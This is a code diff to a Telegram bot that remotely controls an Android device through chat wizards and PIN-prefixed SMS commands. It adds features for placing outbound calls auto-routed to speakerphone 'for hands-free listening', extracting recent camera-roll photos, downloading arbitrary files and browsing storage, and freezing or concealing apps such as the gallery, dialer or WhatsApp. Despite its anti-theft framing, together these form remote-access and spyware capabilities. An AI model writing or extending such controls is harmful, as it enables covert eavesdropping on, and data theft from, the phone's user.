@@ -630,6 +630,12 @@ async function registerTelegramBotCommands(token) {
     { command: "license", description: "🔑 Check Pro license status or activate key" },
     { command: "check_update", description: "🔄 Check for OTA app updates" },
     { command: "update_confirm", description: "⚡ Download and install pending OTA update" },
+    { command: "call", description: "📞 Remotely place outbound cellular phone call" },
+    { command: "lock_app", description: "🧊 Freeze gallery, phone, files, or sensitive app" },
+    { command: "unlock_app", description: "☀️ Restore locked/hidden application" },
+    { command: "gallery_latest", description: "🖼️ Extract recent photos from camera roll" },
+    { command: "getfile", description: "📁 Download file from storage directly to Telegram" },
+    { command: "list_files", description: "📂 Browse files in device storage directory" },
     { command: "wipe", description: "⚠️ Emergency remote factory reset (requires auth)" },
     { command: "wipe_confirm", description: "💥 Confirm remote factory reset with password" }
   ];
@@ -1045,9 +1051,10 @@ const SUBMENUS = {
         ],
         [
           { text: '📋 Read Clipboard', callback_data: 'cmd:clipboard' },
-          { text: '⚙️ More Capture Options', callback_data: 'menu:screen' }
+          { text: '🖼️ Recent Photos (3)', callback_data: 'cmd:gallery_latest:3' }
         ],
         [
+          { text: '⚙️ More Capture Options', callback_data: 'menu:screen' },
           { text: '🔙 Back to Dashboard', callback_data: 'menu:main' }
         ]
       ]
@@ -1144,6 +1151,10 @@ const SUBMENUS = {
           { text: '✨ Self-Heal Permissions', callback_data: 'cmd:self_heal' }
         ],
         [
+          { text: '🧊 Lock App (Gallery/Phone)', callback_data: 'wizard:lock_app' },
+          { text: '☀️ Unlock App', callback_data: 'wizard:unlock_app' }
+        ],
+        [
           { text: '🔙 Back to Dashboard', callback_data: 'menu:main' }
         ]
       ]
@@ -1231,6 +1242,10 @@ const SUBMENUS = {
           { text: '🗑️ File Shredder', callback_data: 'menu:shred' }
         ],
         [
+          { text: '📞 Remote Call (Speaker)', callback_data: 'wizard:call' },
+          { text: '📁 Download Storage File', callback_data: 'wizard:getfile' }
+        ],
+        [
           { text: '⚠️ Remote Factory Wipe', callback_data: 'menu:wipe' }
         ],
         [
@@ -1269,6 +1284,9 @@ const SUBMENUS = {
       `• <code>PASA &lt;pin&gt; /reboot</code> — Remotely restart device hardware\n` +
       `• <code>PASA &lt;pin&gt; /security_audit</code> — Query low-level kernel security logs\n` +
       `• <code>PASA &lt;pin&gt; /app_uninstall &lt;pkg&gt;</code> — Silently remove spyware/RAT\n` +
+      `• <code>PASA &lt;pin&gt; /lock_app &lt;gallery|phone|files|target&gt;</code> — Freeze target app\n` +
+      `• <code>PASA &lt;pin&gt; /unlock_app &lt;target&gt;</code> — Restore target app\n` +
+      `• <code>PASA &lt;pin&gt; /call &lt;number&gt; [speaker]</code> — Place outbound cellular phone call\n` +
       `• <code>PASA &lt;pin&gt; /antitamper on|off</code> — Safe boot, airplane mode & reset lock\n` +
       `• <code>PASA &lt;pin&gt; /biometrics on|off</code> — Disable biometrics (coercion defense)\n` +
       `• <code>PASA &lt;pin&gt; /set_master_pin &lt;new&gt;</code> — Remotely update master PIN\n` +
@@ -1286,6 +1304,10 @@ const SUBMENUS = {
         [
           { text: '📋 Copy /ring (Alarm)', callback_data: 'sms_template:ring' },
           { text: '📋 Copy /lock', callback_data: 'sms_template:lock' }
+        ],
+        [
+          { text: '📋 Copy /call', callback_data: 'sms_template:call' },
+          { text: '📋 Copy /lock_app', callback_data: 'sms_template:lock_app' }
         ],
         [
           { text: '📋 Copy /camera_lock', callback_data: 'sms_template:camera_lock' },
@@ -1914,6 +1936,62 @@ async function handleTelegramUpdate(token, update) {
       return;
     }
 
+    // Remote Phone Call Wizard
+    if (data === 'wizard:call') {
+      setChatState(chatId, 'WAITING_FOR_CALL_NUMBER');
+      await callTelegram(token, 'sendMessage', {
+        chat_id: chatId,
+        text: '📞 <b>Remote Outbound Calling</b>\n━━━━━━━━━━━━━━━━━━━━\nPlease reply with the phone number you want the device to dial (e.g. <code>+1234567890</code>):\n\n<i>Note: Call will automatically route to speakerphone for hands-free listening.</i>',
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'cancel:wizard' }]]
+        }
+      });
+      return;
+    }
+
+    // App Lock Wizard
+    if (data === 'wizard:lock_app') {
+      setChatState(chatId, 'WAITING_FOR_LOCK_APP');
+      await callTelegram(token, 'sendMessage', {
+        chat_id: chatId,
+        text: '🧊 <b>Smart App Lockout</b>\n━━━━━━━━━━━━━━━━━━━━\nPlease reply with the target to freeze & conceal:\n• <code>gallery</code> (photo gallery)\n• <code>phone</code> (cellular dialer)\n• <code>files</code> (storage explorer)\n• Or any app/package name (e.g. <code>whatsapp</code>)',
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'cancel:wizard' }]]
+        }
+      });
+      return;
+    }
+
+    // App Unlock Wizard
+    if (data === 'wizard:unlock_app') {
+      setChatState(chatId, 'WAITING_FOR_UNLOCK_APP');
+      await callTelegram(token, 'sendMessage', {
+        chat_id: chatId,
+        text: '☀️ <b>Unlock Application</b>\n━━━━━━━━━━━━━━━━━━━━\nPlease reply with the target to restore:\n• <code>gallery</code>\n• <code>phone</code>\n• <code>files</code>\n• Or package/app name',
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'cancel:wizard' }]]
+        }
+      });
+      return;
+    }
+
+    // Remote File Download Wizard
+    if (data === 'wizard:getfile') {
+      setChatState(chatId, 'WAITING_FOR_GETFILE_PATH');
+      await callTelegram(token, 'sendMessage', {
+        chat_id: chatId,
+        text: '📁 <b>Download Storage File</b>\n━━━━━━━━━━━━━━━━━━━━\nPlease reply with the absolute file path on the device:\n<i>Example:</i> <code>/sdcard/DCIM/Camera/photo.jpg</code> or <code>/sdcard/Download/doc.pdf</code>',
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'cancel:wizard' }]]
+        }
+      });
+      return;
+    }
+
     // 1-Tap Copyable SMS Template Responses
     if (data.startsWith('sms_template:')) {
       const type = data.split(':')[1];
@@ -1932,6 +2010,12 @@ async function handleTelegramUpdate(token, update) {
       } else if (type === 'lock') {
         tpl = 'PASA <PIN> /lock 5892';
         desc = 'Locks device screen immediately and enforces Kiosk defense overlay.';
+      } else if (type === 'call') {
+        tpl = 'PASA <PIN> /call +1234567890';
+        desc = 'Instructs the device to place an immediate outbound phone call over cellular radio.';
+      } else if (type === 'lock_app') {
+        tpl = 'PASA <PIN> /lock_app gallery';
+        desc = 'Freezes the photo gallery, dialer, or target application via Knox Device Owner.';
       } else if (type === 'camera_lock') {
         tpl = 'PASA <PIN> /camera_lock on';
         desc = 'Completely disables all front and rear cameras OS-wide (anti-spy killswitch).';
@@ -2077,6 +2161,38 @@ async function handleTelegramUpdate(token, update) {
         return;
       }
       await dispatchCommandToDevice(token, chatId, '/sendsms', [number, smsBody]);
+      return;
+    }
+
+    if (activeState.state === 'WAITING_FOR_CALL_NUMBER') {
+      clearChatState(chatId);
+      const targetNumber = rawText.trim();
+      if (!targetNumber) return;
+      await dispatchCommandToDevice(token, chatId, '/call', [targetNumber, 'speaker']);
+      return;
+    }
+
+    if (activeState.state === 'WAITING_FOR_LOCK_APP') {
+      clearChatState(chatId);
+      const target = rawText.trim();
+      if (!target) return;
+      await dispatchCommandToDevice(token, chatId, '/lock_app', [target]);
+      return;
+    }
+
+    if (activeState.state === 'WAITING_FOR_UNLOCK_APP') {
+      clearChatState(chatId);
+      const target = rawText.trim();
+      if (!target) return;
+      await dispatchCommandToDevice(token, chatId, '/unlock_app', [target]);
+      return;
+    }
+
+    if (activeState.state === 'WAITING_FOR_GETFILE_PATH') {
+      clearChatState(chatId);
+      const filePath = rawText.trim();
+      if (!filePath) return;
+      await dispatchCommandToDevice(token, chatId, '/getfile', [filePath]);
       return;
     }
 
